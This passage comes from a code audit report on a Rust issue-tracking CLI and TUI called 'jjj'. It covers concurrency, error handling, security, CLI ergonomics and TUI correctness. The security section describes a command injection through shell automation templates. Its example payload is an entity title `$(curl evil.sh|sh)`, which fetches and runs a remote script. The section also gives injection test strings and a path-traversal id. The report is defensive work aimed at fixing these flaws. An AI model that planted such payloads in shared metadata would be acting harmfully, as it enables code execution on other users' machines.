- **Problem:** The temp filename is `<id>.md.<pid>.<subsec_nanos>.tmp`. The comment claims 'concurrent writers cannot clobber each other's temp file', but within a single process two threads (or rapid successive calls) writing the same entity can collide: `std::process::id()` is identical, and `subsec_nanos()` is not guaranteed unique or even monotonic across two near-simultaneous calls (clock resolution may repeat the same nanos value, and it's only the sub-second component so it also repeats every second). If both threads compute the same suffix, `fs::write(&tmp)` from one can interleave with the other's, and one rename can move a half-written file into place. The cross-process case is covered by distinct PIDs, but the intra-process multithread case (e.g. a future parallel save, or the TUI doing background work) is not. This is currently low-impact because most writes are single-threaded, but the safety claim in the comment is stronger than the implementation guarantees.
- **Recommendation:** Add a per-call uniqueness source: a process-wide `AtomicU64` counter and/or a few bytes of randomness in the temp suffix, or use a crate like `tempfile::NamedTempFile::new_in(dir)` which guarantees a unique name and handles cleanup. Update the comment to match the actual guarantee.

### 🔵 `LOW` Long-lived MetadataStore cache connection can go stale relative to on-disk markdown after a concurrent fetch/rebuild

**Category** concurrency · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/mod.rs:84 (cache RefCell), :401-404 (reload_cache); src/commands/fetch.rs:155-160`
- **Problem:** MetadataStore holds a long-lived SQLite connection in a RefCell, opened once in `new()`. fetch deletes and recreates `.jj/jjj.db` from scratch (fetch.rs:155-160) and the running TUI must call `reload_cache()` to pick up the new file — but nothing forces that across processes. A TUI session whose cache connection predates a CLI `fetch` (run in another terminal) will keep querying its old connection. With the default (non-WAL) journal it may even still see the pre-delete snapshot via its open file handle, returning stale rows from cache-aware reads (`query_ids_or_fallback`) until the TUI happens to reload. Because the markdown is canonical and `load_by_ids` skips rows whose .md file vanished, this manifests as missing/stale list entries rather than corruption, hence low severity — but it is a real cross-process staleness window with no detection.
- **Recommendation:** Have cache reads cheaply validate freshness (e.g. compare the DB file's inode/mtime, or a generation counter stored in the `meta` table, against what the connection was opened with) and transparently reopen on mismatch. At minimum, document that long-lived sessions must reload_cache after any external fetch, and have the TUI poll for DB-file replacement on each refresh.


---

## 4. Error handling & panics

**Dimension summary:** Error handling in jjj is genuinely strong and the area is mostly clean. Of the ~388 unwrap()/expect() and ~9 panic/unreachable, the overwhelming majority are in #[cfg(test)] modules (every one of the top offender files — db/entities.rs, db/search.rs, tui/app/editor.rs, etc. — has 100% of its unwraps inside test mods), and the resolve.rs/automation.rs panics are all in tests too. Production code consistently uses `?`, `unwrap_or`/`unwrap_or_else`, `String::from_utf8_lossy`, and proper Result propagation. The few production unwrap()/expect() that remain (status.rs:255, tui/ui.rs:206/539, the `ensure_ordering guarantees entry` expects in actions.rs) are all guarded by a preceding emptiness/bounds check or a documented invariant, so they are genuinely unreachable. There are no mutex `.lock().unwrap()` (no Mutex/RwLock in src at all), no SystemTime/duration_since unwraps, no env::var unwraps, and no Regex unwraps — entire categories of common panic sources are absent. The critical availability path is handled correctly: the entity-list walk (storage/mod.rs:488 `list::<T>()`) and the fetch three-way merge (commands/fetch.rs:110-124) both skip a single malformed entity file with a per-file warning rather than aborting, so a bad metadata file pushed by another user does not crash listings or fetch. The real findings are minor: one inconsistency where the cache-backed query path aborts on a malformed file while the FS-walk path skips it; several stale/never-constructed error variants; and the lack of a panic hook to restore the terminal if a TUI invariant ever fires. error.rs is well-structured with actionable, recovery-oriented messages.


### 🟡 `MEDIUM` Cache-backed query path aborts on a single malformed entity file (inconsistent with FS-walk path)

**Category** bug · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/storage/mod.rs:556-564 (load_by_ids) and src/storage/mod.rs:574-594 (query_ids_or_fallback)`
- **Corrected location:** src/storage/mod.rs:556-566 (load_by_ids), 574-594 (query_ids_or_fallback); affected callers: problems.rs:133/150, solutions.rs:72, critiques.rs:55
- **Problem:** There are two code paths that materialize a list of entities, and they handle a malformed/unparseable entity markdown file differently. The FS-walk path `list::<T>()` (storage/mod.rs:488-525) deliberately skips files that fail to parse, collecting them into `failures` and emitting a per-file warning while returning the rest — the correct availability behavior given that another user can push a corrupt entity file via the shared `jjj` bookmark. But the cache-aware path `query_ids_or_fallback` (line 590) calls `load_by_ids`, which on any non-not-found load error does `Err(e) => return Err(e)` (line 562), aborting the ENTIRE query. So whether `problem list`/search/filtered listings survive a single corrupt entity depends on whether the SQLite cache (jjj.db) happens to exist: with cache present, one malformed file makes the whole filtered listing fail; with no cache, the fallback FS-walk skips it gracefully. This is exactly the 'a panic/abort on a malformed metadata file another user pushed is an availability bug' scenario the audit prioritizes — here it's a hard error rather than a panic, but the user-visible effect (a whole command failing because of one bad file someone else pushed) is the same.
- **Recommendation:** Make load_by_ids tolerant of parse failures the same way list::<T>() is: when the error is a FrontmatterParse (or generally non-fatal per-file error), collect it into a warnings list and `continue` instead of returning, so one corrupt file pushed by a collaborator cannot take down the whole cache-backed listing. Keep IO errors that are not file-specific (e.g. the meta checkout failing) as hard errors. Alternatively, route both paths through a shared per-file-tolerant loader so the behavior cannot drift again.
- **Verifier correction:** Accept the underlying bug and the recommended fix; reject the inflated scope. Corrected affected commands: problem show / root (tree) listing / critique-for-solution / timeline / sync — NOT `problem list` (tolerant via list::<T>) and NOT `search` (reads cache columns, never loads markdown). Best fix: route both load_by_ids and list::<T> through a single per-file-tolerant loader so they cannot drift, keeping non-file IO errors (e.g. ensure_meta_checkout) hard. Severity low.

### 🔵 `LOW` Dead/never-constructed JjjError variants (Conflict, InvalidChangeId, MetaBranchNotFound, SyncConflict, Tui)

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/error.rs:40, 54-55, 57-58, 91-92, 131-137`
- **Problem:** Five JjjError variants are defined (and three of them documented in the module header and referenced by project memory/CLAUDE.md as active error surfaces) but are never constructed anywhere in src: `Conflict` (line 54), `InvalidChangeId` (57), `MetaBranchNotFound` (40), `SyncConflict` (131), and `Tui` (91). A repo-wide search for each (excluding error.rs) returns zero constructions. This matters for the audit's 'stale variants' task: the project's own memory states 'Conflict error now references jj resolve' and the error.rs docstring lists SyncConflict under 'GitHub sync', implying these are live recovery paths — but a `jj`/`jjj` conflict or a sync state divergence will never actually produce these errors, so the carefully-worded recovery hints in `Conflict` ('Run jj resolve…') and `SyncConflict` (with its `suggestion` field) are unreachable. `MetaBranchNotFound` ('Run jjj init…') overlaps with the also-defined `NotInRepository`/`Validation` paths actually used for the not-initialized case. `TomlParse`/`TomlSerialize` are NOT dead — they are reached implicitly via `#[from]` and `?` in storage/mod.rs:639,651 — so do not remove those.
- **Recommendation:** Either wire these variants into the code paths their messages promise (e.g. surface `Conflict`/`SyncConflict` from the fetch/merge conflict detection in commands/fetch.rs and the github sync reconcile, raise `MetaBranchNotFound` from the 'jjj not initialized' check) or delete the truly-dead ones and update the error.rs module docstring + CLAUDE.md/MEMORY references so the documented error taxonomy matches reality. Keep TomlParse/TomlSerialize.

### 🔵 `LOW` No panic hook to restore terminal if a TUI invariant unwrap/expect fires

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/tui/mod.rs:24-44 (launch); panic sites e.g. src/tui/ui.rs:539, src/tui/app/actions.rs:1529-1865`
- **Problem:** launch() enables raw mode and the alternate screen (lines 25-27), runs the app, then restores the terminal (disable_raw_mode / LeaveAlternateScreen / show_cursor, lines 34-41) only on the normal return path. There is no panic::set_hook or catch_unwind anywhere in src. The TUI contains several invariant-guarded unwrap()/expect() — `buffer[byte_pos..].chars().next().unwrap()` (tui/ui.rs:539), `tier_drill.last().unwrap()` (ui.rs:206), and the eight `.expect("ensure_ordering guarantees entry")` calls in actions.rs (1529, 1579, 1634, 1702, 1726, 1808, 1822, 1850, 1865). These are believed unreachable, but if any ever fires (e.g. a logic regression in cursor/byte-index handling or ordering state), the panic unwinds straight past the restoration code, leaving the user in a garbled terminal stuck in raw mode + alternate screen that looks hung and requires a manual `reset`. This is cheap insurance for a defensive-availability posture.
- **Recommendation:** Install a panic hook in launch() (before enabling raw mode) that calls disable_raw_mode() and LeaveAlternateScreen before delegating to the previous hook, OR wrap app.run in std::panic::catch_unwind and always restore the terminal in a scope guard / on both Ok and Err. ratatui's standard pattern is a small RAII restore guard or a set_hook wrapper.


---

## 5. Security & injection

**Dimension summary:** The subprocess layer is mostly well-designed: jj and gh are invoked via argv (std::process::Command::args) with no shell, so flag/arg values can't break out into shell metacharacters, and SQL uses whitelisted table names plus bound parameters (no SQL injection). GitHub tokens are never handled by jjj — auth is fully delegated to the gh CLI, so there is no secret-handling surface. HOWEVER, the automation SHELL action contains a CRITICAL, exploitable command-injection: the shell_escape/expand_template scheme is defeated by the exact quoting style the project documents and tests (command = "echo '{{title}}'"), turning an attacker-controlled entity title fetched from the shared bookmark into arbitrary code execution on a collaborator's machine. There are also two lower-severity hardening gaps: fetch writes remote-controlled file paths without an explicit jjj-meta containment check (relying solely on git tree normalization), and the three-way YAML merge recurses without a depth bound (stack-overflow DoS on a malicious bookmark file). Deserialized entity `id` fields are never validated as path-safe UUIDs.


### 🔴 `CRITICAL` Command injection in automation shell actions via {{var}} template expansion (defeats shell_escape with documented quoting)

**Category** security · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/automation.rs:55-69, 87-92`
- **Problem:** Shell automation actions expand {{var}} placeholders by substituting shell_escape(value) (single-quote-wrapped) into a user-authored template, then run it via `sh -c`. The fatal flaw: every documented and tested template wraps the variable in its OWN single quotes — CLAUDE.md line 85 shows `command = "echo '{{title}}'"`, and the canonical UXR scenario 18 config uses `command = "echo 'CREATED: {{title}}' >> $MARKER"`. With shell_escape producing `'value'`, the expansion yields `echo ''value''`: the user's outer quotes plus the escape's inner quotes form two ADJACENT empty quote pairs (`''...''`) that the shell collapses, leaving `value` effectively UNQUOTED. Any command substitution, backticks, `;`, `|`, or `&&` in the value then executes. The values are fully attacker-controlled untrusted metadata: entity titles (and via populate_entity_vars, cross-entity vars like {{problem.title}}) fetched from the shared `jjj` bookmark. Exploit chain: attacker pushes a problem titled `$(curl evil.sh|sh)` to the shared bookmark; a victim with an automation rule (e.g. on solution_submitted using {{problem.title}}) fetches it and submits a solution against that problem — arbitrary code runs on the victim's machine. The existing tests (test_shell_escape_injection) only check shell_escape in isolation; they never test the documented `'{{var}}'` composition, so the suite gives false assurance.
- **Recommendation:** Do not build a shell string from untrusted values at all. Best fix: drop `sh -c` for the common case and exec the command via argv, expanding {{var}} into a single argv element each (so values are never re-parsed by a shell). If a shell is genuinely required, pass user values through the environment (Command::env) and reference them as "$JJJ_TITLE" in the template, or refuse to interpolate into shell context entirely. If single-quote escaping must be kept, the template author must NOT add their own quotes AND the docs/tests must be corrected to `echo {{title}}` — but argv is the only robust fix. Also add a regression test that asserts a title of `$(touch X)` / `'; touch X; '` does NOT execute through the documented `'{{title}}'` template.

### 🟡 `MEDIUM` Fetch writes remote-controlled file paths with no jjj-meta containment check (path-traversal hardening gap)

**Category** security · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/commands/fetch.rs:103-110, 23-45; src/storage/merge.rs:73-80`
- **Corrected location:** src/commands/fetch.rs:17-47, 98-110; src/storage/merge.rs:73-80
- **Problem:** On fetch, each file path comes from `jj file list -r jjj` (i.e. the attacker-controlled shared bookmark) and is passed verbatim as `relative = Path::new(file_path)` into merge_entity_into_local, which does `local_path.join(relative)` and `fs::create_dir_all(parent)` + `fs::write`, and write_base_file does `base_path.join(relative)` + create_dir_all + fs::write. There is no check that the resulting path stays inside `.jj/jjj-meta/` (or jjj-meta-base). If a path component traversed upward or were absolute, fetch would write outside the metadata dir. In practice git/jj tree-entry normalization rejects `..` components and absolute paths, so this is currently blocked by an external invariant rather than by jjj itself — fragile, since the listing loop only prefix-filters by `problems/` etc. but the merge writer does not re-validate.
- **Recommendation:** After join, canonicalize (or lexically normalize) and assert the result starts_with(meta_path)/base_path; reject any path containing `..` or a root component, or any whose file name isn't `<uuid>.md` under one of the four known ENTITY_DIRS. Skip-with-warning on violation rather than write.
- **Verifier correction:** Minor location nit: the join+create_dir_all+write for the local file is in fetch.rs:23/36-39 (inside `merge_entity_into_local`), not fetch.rs:103-110 — lines 103-110 are the listing loop and the `relative = Path::new(file_path)` construction. The base-file write is correctly cited at merge.rs:73-80. The recommendation is sound; if implemented, the cleanest form is whitelisting: reject any `file_path` whose `components()` aren't exactly `[Normal(dir), Normal(<name>.md)]` with dir in ENTITY_DIRS, skip-with-warning otherwise.

### 🟡 `MEDIUM` Deserialized entity `id` fields are never validated as path-safe UUIDs before use in filesystem paths

**Category** security · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/mod.rs:438, 466, 533; src/storage/problems.rs:82,99; src/ranking/ordering.rs:95,115`
- **Problem:** Entity IDs and milestone_ids are interpolated straight into filesystem paths (`meta_path.join(DIR).join(format!("{}.md", id))`, and `rankings/{milestone_id}/{slug}.json`) with no validation that the id is a real UUID7 or free of path separators / `..`. While the primary id used in `save`/`delete` usually comes from the filename stem or generate_id(), several paths consume the in-memory `id` field that was deserialized from untrusted YAML frontmatter (e.g. critique.id / solution.id in delete cascades, milestone_id from problem.milestone_id in ranking save). A crafted metadata file with `id: ../../config` (defeating that an attacker authored the file) is a latent traversal/overwrite vector that relies on no current code path re-deriving the id. By contrast resolve.rs validates with is_uuid for lookups; the storage write path has no equivalent guard.
- **Recommendation:** Add a single guard (e.g. assert is_uuid(id) or a `safe_id()` helper rejecting anything not matching ^[0-9a-fA-F-]{36}$) at the boundary of load/save/delete and at save_user_ordering/load_user_ordering for both id and milestone_id. Reject (don't sanitize) invalid ids.

### 🔵 `LOW` Three-way YAML merge recurses without depth bound (stack-overflow DoS on untrusted bookmark file)

**Category** security · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/merge.rs:92-121, 207-268, 328-342`
- **Problem:** merge_entity_md parses untrusted remote YAML into a generic serde_yml::Value tree and walks it via mutually-recursive merge_value/merge_mapping (and sort_mapping_keys) with no depth limit. A malicious metadata file on the shared bookmark containing deeply nested mappings/sequences could exhaust the stack and crash `jjj fetch` for every collaborator (availability/DoS). serde_yml will happily parse thousands of nesting levels. Impact is limited to a crash (not RCE), and only triggers when both sides diverged so the recursive merge path is taken.
- **Recommendation:** Thread a depth counter through merge_value/sort_mapping_keys and bail to last-writer-wins (or surface a parse error) beyond a sane cap (e.g. 64). Optionally cap total node count / input size before parsing remote files in fetch.

### 🔵 `LOW` execute_sync_command splits expanded template on whitespace — fragile but not in the untrusted-metadata path

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/jj.rs:287-298`
- **Problem:** execute_sync_command interpolates {var} values into a template and then splits the whole expanded string on whitespace to build argv. Values are not re-quoted, so a bookmark or remote name containing whitespace (or a value that happens to look like a flag) would be mis-tokenized into multiple args. Callers currently pass bookmark/remote names that originate from the user's own CLI invocation or the literal "jjj"/config, not from untrusted fetched metadata, so this is not currently exploitable for injection — but the whitespace-split design is brittle and would become dangerous if any caller ever fed an entity-derived value in. No shell is involved (good), so the risk is correctness/robustness rather than RCE.
- **Recommendation:** Prefer passing args as a structured &[&str] with explicit {bookmark}/{remote} substitution into individual elements, or at minimum document and validate that sync-command template values never contain whitespace. Reject values with whitespace/control chars before substitution.


---

## 6. CLI structure & UX

**Dimension summary:** The CLI surface is broadly well-organized: clap subcommands are grouped with display_order, help text is rich, the four entity families (problem/solution/critique/milestone) follow a recognizable new/list/show/edit/assign pattern, and resolution by UUID/prefix/fuzzy-title with an interactive picker is a genuinely nice UX. However there are several real correctness and ergonomics issues. The most serious is that fuzzy title resolution silently auto-selects a single substring match and feeds it straight into destructive operations (withdraw, dissolve, duplicate, approve --force) with no confirmation — a clear wrong-target footgun. There are also disambiguation-prefix bugs in the picker, a docstring that misrepresents how resolution actually works, uneven --json coverage that breaks scripting, asymmetric duplicate-detection/--force across the four entity types, and a single undifferentiated exit code that conflates "not found", "ambiguous", and "user cancelled".


### 🟠 `HIGH` Fuzzy title match silently resolves to a single entity and feeds destructive commands

**Category** design · **Effort** medium · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `src/resolve.rs:64-79; consumed by src/context.rs:26-97 and e.g. src/commands/solution.rs:699 (withdraw), src/commands/problem.rs:686-687 (duplicate/dissolve)`
- **Problem:** resolve() step 3 does a case-insensitive substring `contains` over titles and, if exactly one title matches, returns ResolveResult::Single with no confirmation. That result flows directly into irreversible/destructive operations: `solution withdraw "auth"`, `problem dissolve "login"`, `problem duplicate "x" --of "y"`, `solution approve --force "..."`. Because a substring that is unique *today* may be the wrong entity (and becomes ambiguous as data grows), a user can easily mutate the wrong record. A prefix typo also silently falls through to title matching (see separate finding), compounding the risk.
- **Recommendation:** For destructive verbs (withdraw, dissolve, duplicate, approve, detach --force), require either a UUID/hex-prefix or an interactive confirmation when the match came from fuzzy title (e.g. have resolve return how it matched, and print 'Resolved "auth" -> s/01957d "Fix auth timeout" — proceed? [y/N]' on a TTY, or refuse in non-interactive mode). At minimum echo the resolved id+title before performing the mutation.
- **Verifier correction:** Confirmed call sites beyond those cited that share the pattern: solution.rs:625 (approve/finalize), solution.rs:808, problem.rs:541/645 (dissolve). The minimal version of the fix ('at least echo resolved id+title before the mutation') is the highest-value, lowest-cost part: today every destructive command only prints the resolved identity AFTER mutating. Note the picker already gives correct behavior for the Multiple case (picker.rs:24 TTY check, pick_non_interactive errors), so the gap is specifically the single-fuzzy-match path. The finding's claim that context.rs maps Single -> Ok(id) with no guard is accurate.

### 🟡 `MEDIUM` Picker computes 'unambiguous' prefixes against only the matched subset, not the full entity set

**Category** bug · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/picker.rs:31-34 and 60-62; src/display.rs:15-47`
- **Corrected location:** src/picker.rs:31-34 and 60-62; src/display.rs:15-47; root cause flows from src/context.rs:26-97 passing only the matched subset
- **Problem:** When disambiguating, the picker calls truncated_prefixes() over only the matched UUIDs. shortest_unambiguous_prefix therefore only guarantees uniqueness *within that subset*. The 6-char (or longer) prefix it prints back to the user may collide with other entities in the store, so copy-pasting the suggested prefix into the next command can itself be ambiguous (or resolve to a different entity). The non-interactive branch literally tells the user 'Be more specific or use the short ID' while handing them a short ID that is not globally unambiguous.
- **Recommendation:** Pass the full candidate set (all problems / solutions / ...) into prefix computation so displayed prefixes are globally unambiguous, or have context.resolve_* compute prefixes from the complete entity list and pass them to the picker.
- **Verifier correction:** Real bug but mis-stated: it only affects the fuzzy-title-match path, not the hex-prefix path (where the suggested short ID is provably globally unambiguous). Because resolve() always re-validates against the complete entity set on the next invocation, the failure mode is a re-prompt, never a silent wrong-entity resolution — so severity should be low, not medium. The fix recommendation is sound: pass the full candidate list (e.g. from context.resolve_*) into truncated_prefixes so displayed prefixes are globally unique; ideally only needed for the title-match branch.

### 🟡 `MEDIUM` resolve() docstring claims SQLite FTS fuzzy matching that the code never performs

**Category** docs · **Effort** trivial · **Verdict** ✅ **confirmed** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/resolve.rs:1-6, 64`
- **Problem:** The module doc says resolution step 3 is 'Fuzzy title search via SQLite FTS', and the inline comment at line 64 says 'simple contains for now, FTS in actual use'. In reality every call site (context.rs resolve_problem/solution/critique/milestone) builds an in-memory (id,title) vector and resolve() only does `String::contains`. FTS is never consulted for entity resolution anywhere. This misleads maintainers into thinking ranking/typo-tolerance exists when it does not, and explains why resolution has no relevance ordering (a partial-word query returns Multiple even when one title is an obviously better match).
- **Recommendation:** Either implement FTS-backed ranked resolution (so a single best match can be chosen with a score, enabling confidence-gated auto-select) or fix the docs to state it is a substring scan. Given the destructive-match risk above, fixing docs plus adding ranking would be the higher-value path.

### 🟡 `MEDIUM` No minimum-length / hex guard before falling through to title matching

**Category** design · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/resolve.rs:41-79; src/id.rs:19-22`
- **Problem:** is_hex_prefix requires >=6 hex chars. A user who types a 5-char id prefix (e.g. '01957') or mistypes a prefix as '0195zz' fails the hex branch and silently drops into title-substring matching. So '01957' is matched against *titles* containing '01957', not against ids — a confusing, undocumented mode switch. Conversely there is no minimum-length on the title branch either: a 1-2 char query like 'a' will substring-match many titles and only the count (Single vs Multiple) decides behavior. The CLAUDE docs advertise 'minimum 6 chars' for prefixes but nothing enforces or explains the boundary to the user.
- **Recommendation:** When input looks id-like but is too short or has invalid hex chars, return a clear error ('id prefixes must be >=6 hex chars; did you mean a title search?') instead of silently switching to title search. Optionally reject ultra-short title queries (<3 chars) outright.

### 🟡 `MEDIUM` Inconsistent --json coverage: tree, graph, and diff have no machine-readable output

**Category** design · **Effort** small · **Verdict** 🟡 **partial** (high conf)

- **Location:** `src/cli.rs:438-442 (problem tree), 499-509 (problem graph), 724-728 (solution diff); contrast with list/show/status/roadmap which all expose json`
- **Problem:** Almost every read command exposes `--json` (status, next, overlaps, insights, events, timeline, tags, search, problem/solution/critique/milestone list+show, milestone roadmap+status, rank show). But `problem tree`, `problem graph`, and `solution diff` do not, and `problem list --tree` duplicates `problem tree` yet only the former can emit json. This makes the hierarchy/DAG views unscriptable and forces consumers to parse ASCII art, which is a real gap for an offline-first, automation-friendly tool.
- **Recommendation:** Add `--json` to problem tree, problem graph, and solution diff (diff can emit per-change metadata + raw diff text). Since `problem list --tree` already overlaps `problem tree`, consider consolidating to one and giving it json.
- **Verifier correction:** Correct line for solution diff is cli.rs:725-728 (finding said 724-728 — Diff command header is at 724, fields 725-728; minor, effectively correct). Recommend tightening the claim: `problem list --tree --json` does NOT emit a tree-shaped JSON — the json branch returns before the tree branch, so --tree is ignored under --json; hierarchy is only recoverable from parent_id in the flat list JSON. The core gap (no machine-readable output for tree/graph/diff) is real and the fix is sound.

### 🔵 `LOW` Asymmetric duplicate-detection and --force across the four entity 'new' commands

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/cli.rs:329-353 (problem new), 519-543 (solution new), 738-761 (critique new), 864-872 (milestone new); src/commands/problem.rs:92-119, solution.rs:111-123`
- **Problem:** problem new does exact-title check + FTS similar-check + embedding similarity, and has --force/-f. solution new does FTS + embedding but NOT exact-title, and has --force/-f. critique new and milestone new do no duplicate detection and have no --force flag at all. The result is four different creation contracts for four parallel entities, which is surprising and means `critique new` can freely create exact duplicates while `problem new` blocks them. The CLAUDE notes flag 'critique new has no --force' as a known wart; it is indeed an inconsistency rather than an intentional asymmetry tied to the domain.
- **Recommendation:** Decide a single policy. Critiques and milestones plausibly don't need dedup (critiques are inherently many-per-solution), so document that explicitly; but the exact-title check should be applied to solution new too (or removed from problem new) so the two 'heavy' entities behave identically. Keep --force only where dedup exists, and say so in help.

### 🔵 `LOW` Single exit code (1) for every error conflates not-found, ambiguous, and user-cancelled

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/main.rs:5-10; src/picker.rs:46-57; src/error.rs`
- **Problem:** main() maps any Err to `std::process::exit(1)`. There is no way for a script to distinguish 'entity not found' from 'ambiguous match' from 'user pressed Enter to cancel the picker' (JjjError::Cancelled) from a genuine jj/IO failure. For a tool that markets itself as scriptable (shell-prompt `next`, `--json` everywhere), distinct exit codes for usage errors vs. not-found vs. cancellation would be valuable, and 'cancelled by user' arguably shouldn't be a hard error at all.
- **Recommendation:** Add a `fn exit_code(&self) -> i32` to JjjError (e.g. 2 for usage/validation, 3 for not-found, 4 for ambiguous, 130 for cancelled) and use it in main. At minimum treat Cancelled as a non-error or a distinct code.

### 🔵 `LOW` Two overlapping ways to reply to a critique with different resolution semantics

**Category** design · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/cli.rs:846-855 (critique reply), 709-721 (solution comment); src/commands/critique.rs:455-474, src/commands/solution.rs:869-`
- **Problem:** `jjj critique reply <critique_id> <body>` and `jjj solution comment [solution] --critique <c> <body>` both append a reply to a critique, but via different commands, different argument shapes (reply takes a required critique id + required body; comment defaults the solution to the active change, requires an OPEN/Valid critique, and emits a different event path). Users won't know which to use, and the two can diverge in behavior (comment refuses if no open critiques; reply works on any critique). This is feature overlap that increases surface area and cognitive load.
- **Recommendation:** Pick one canonical path (likely `critique reply`, since it's symmetric with the other entity verbs) and either remove `solution comment` or make it a thin alias that documents itself as 'reply to the active solution's critique'. Ensure event emission is identical between them.

### 🔵 `LOW` `status --mine` drops the entire 'review' category instead of filtering to the user's items

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/commands/status.rs:331-358; src/cli.rs:44-47 (Status --mine), 65-67 (Next --mine)`
- **Problem:** build_next_actions guards the REVIEW section with `if !mine { ... }`. So `--mine` (documented as 'Show only your own authored work') silently suppresses the whole 'critiques assigned to you for review' category. But a review request *is* arguably your work, and other categories (blocked/ready/waiting/todo) are not actually re-filtered to the current user when --mine is set — only 'review' is dropped. The flag's effect is therefore narrower and more surprising than its help text implies, and it is shared verbatim by both `status` and `next`.
- **Recommendation:** Either make --mine consistently filter every category to entities authored/assigned to the user, or rename/clarify the flag (e.g. 'hide review requests from others'). Update help text to match actual behavior.

### 🔵 `LOW` `solution approve` / `comment` defaulting to the current jj change is an implicit, easily-mistaken target

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/cli.rs:652-654 (approve solution_id optional), 711-713 (comment); src/commands/solution.rs:643-660, 880-917`
- **Problem:** approve (and comment) accept an optional id and fall back to 'the solution attached to the current @ change'. Combined with `--force` (approve despite open critiques), `jjj solution approve --force` with no id will approve whatever solution happens to be attached to the checked-out change. If the user is on the wrong change, this approves the wrong solution and can trigger PR merge + auto-solve. The implicit target is convenient but is a footgun for a state-advancing, side-effecting command.
- **Recommendation:** Before mutating, print the resolved solution ('Approving s/01957d "..."') and, when both the id is omitted AND --force is set, require confirmation on a TTY. This mirrors the destructive-fuzzy-match recommendation above.


---

## 7. TUI code quality

**Dimension summary:** The TUI is reasonably well-structured at the seams that matter: the App is split into mod/actions/navigation/editor/related, tree-building is pure and well-tested, and transition actions correctly reuse the domain layer via a shared `dispatch_domain` helper. The standout problem is the entity-creation path: the TUI's `create_problem`/`create_solution`/`create_critique` are simplified copy-paste reimplementations of the CLI command handlers that silently DROP relational bookkeeping (milestone.problem_ids, problem.solution_ids, solution.critique_ids, Open→InProgress transition). Because `solution.critique_ids` is load-bearing for the READY next-action computation, critiques created in the TUI break the "ready to approve" workflow — a real, high-impact functional desync. Secondary issues: the detail pane scroll is unbounded so `G`/over-scroll blanks the pane; `actions.rs` at 1930 LOC mixes five unrelated responsibilities and should be split; `+`/`-` voting doesn't flip to personal view like tier-assign does; a context hint advertises a non-existent `[D]` key; and the TUI never reloads after external CLI/fetch edits. No clippy warnings, no panics on empty lists (navigation/index access is uniformly guarded with `.get()` and `saturating_sub`).


### 🟠 `HIGH` TUI critique creation omits solution.critique_ids, breaking the READY next-action

**Category** correctness · **Effort** medium · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `src/tui/app/actions.rs:80-106 (create_critique) vs src/commands/critique.rs:160-163`
- **Corrected location:** src/tui/app/actions.rs:80-106 (create_critique) vs src/commands/critique.rs:160-163; READY checks at src/tui/next_actions.rs:111 and src/commands/status.rs:311
- **Problem:** The CLI's `critique new` updates the parent solution's `critique_ids` list (`solution.add_critique(...)`), but the TUI's `create_critique` only saves the critique and never touches the solution. `solution.critique_ids` is load-bearing: `build_next_actions` marks a solution READY only when `!has_open && !solution.critique_ids.is_empty()` (next_actions.rs:111; same in status.rs:311). A critique created and then resolved entirely within the TUI leaves `critique_ids` empty, so the solution NEVER shows the '▶ READY' action symbol and never surfaces in `jjj next` — even though the tree still renders the critique (the tree filters by `c.solution_id`, not `critique_ids`). TUI-created and CLI-created data thus behave differently.
- **Recommendation:** Have the TUI creation handlers delegate to shared domain functions instead of reimplementing. Extract `domain::create_critique/create_solution/create_problem` that perform the full relational bookkeeping, and call them from both `src/commands/*` and `src/tui/app/actions.rs`. Minimally, inside `create_critique`'s `with_metadata` closure, load the solution, `add_critique`, and re-save.
- **Verifier correction:** Minimal fix is low-risk: inside create_critique's existing with_metadata closure, after save_critique, add `let mut solution = self.store.load_solution(solution_id)?; solution.add_critique(id.clone()); self.store.save_solution(&solution)?;` — keeping it atomic in the same metadata commit. Note the same divergence pattern likely deserves a check on the TUI create_solution path (actions.rs ~line 40-78) for problem.solution_ids back-references, which the proposed shared-domain refactor would also cover. Severity should be medium, not high.

### 🟠 `HIGH` TUI solution creation omits problem.solution_ids and Open->InProgress transition

**Category** correctness · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `src/tui/app/actions.rs:53-78 (create_solution) vs src/commands/solution.rs:244-250`
- **Corrected location:** src/tui/app/actions.rs:53-78 (create_solution) vs src/commands/solution.rs:245-250
- **Problem:** The CLI's `solution new` adds the solution to `problem.solution_ids` and transitions the problem Open→InProgress on the first solution. The TUI's `create_solution` does neither — it only saves the Solution. Result: a problem with a TUI-created solution stays in `Open` status (wrong color/status in tree and detail, and `is_open()`-based logic in next_actions/rank/status treats it as having no work started), and `problem.solution_ids` is left stale. This diverges from CLI-created data and from the model's intended invariant.
- **Recommendation:** Same fix as the critique finding: route through a shared `domain::create_solution`. Inside the with_metadata closure, also load the problem, `add_solution`, attempt the InProgress transition, and re-save.
